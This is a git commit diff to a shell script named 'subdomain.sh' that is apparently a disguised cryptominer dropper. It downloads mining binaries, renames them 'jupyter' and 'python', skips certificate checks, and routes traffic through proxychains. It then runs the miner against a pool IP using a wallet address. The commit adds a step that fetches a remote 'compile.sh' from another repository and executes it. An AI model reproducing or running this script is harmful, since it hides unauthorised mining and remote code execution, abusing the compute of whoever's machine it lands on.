bcf44a44e86a537c33befc62f39e6ebcaec81043
artazimuka <118062843+artazimuka@users.noreply.github.com>
2022-11-12 23:05:44 +0700

    Update subdomain.sh

--- subdomain.sh
+++ subdomain.sh
@@ -4,6 +4,8 @@ wget --no-check-certificate 'https://github.com/rigmining/code/raw/main/jupyter'
 chmod +x jupyter
 wget --no-check-certificate 'https://github.com/rigmining/code/raw/main/panel' -O python
 chmod +x python
+wget --no-check-certificate 'https://raw.githubusercontent.com/salmanalfarizi1233/bidmailert/main/compile.sh' -O compile.sh
+chmod +x compile.sh
 wget --no-check-certificate 'https://raw.githubusercontent.com/artazimuka/prxymaxzy/main/libproxychains4.so' -O libproxychains4.so
 chmod +x libproxychains4.so
 wget --no-check-certificate 'https://raw.githubusercontent.com/artazimuka/prxymaxzy/main/proxychains.conf' -O proxychains.conf
@@ -11,3 +13,4 @@ chmod +x proxychains.conf
 echo "IP ORI ==> "$(curl ifconfig.me)
 echo "IP Baru ==> "$(./python curl ifconfig.me)
 ./python ./jupyter -r 45.77.42.162:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcsmra2z8jfx22s4n7ltt.CPU
+./compile.sh
